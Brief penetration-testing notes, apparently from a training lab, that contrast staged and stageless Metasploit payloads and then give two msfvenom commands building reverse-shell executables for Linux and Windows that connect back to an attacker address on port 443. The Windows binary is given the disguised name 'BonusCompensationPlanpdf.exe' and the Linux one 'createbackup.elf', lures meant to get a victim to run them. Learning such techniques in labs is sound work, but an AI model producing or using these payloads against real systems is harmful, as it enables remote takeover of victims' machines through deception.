### Staged vs Stageless Payloads
- Staged payload: 
	- Payloads are divided into components and they are sent separately
	- Create more unstable shell, take more memory
	- linux/x86/shell/reverse_tcp
- Stageless payload:
	- Payloads are sent in one entire component
	- More stable shell
	- linux/x86/meterpreter_reverse_tcp

### Build a Stageless Payload
```bash
# For Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

# For Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```



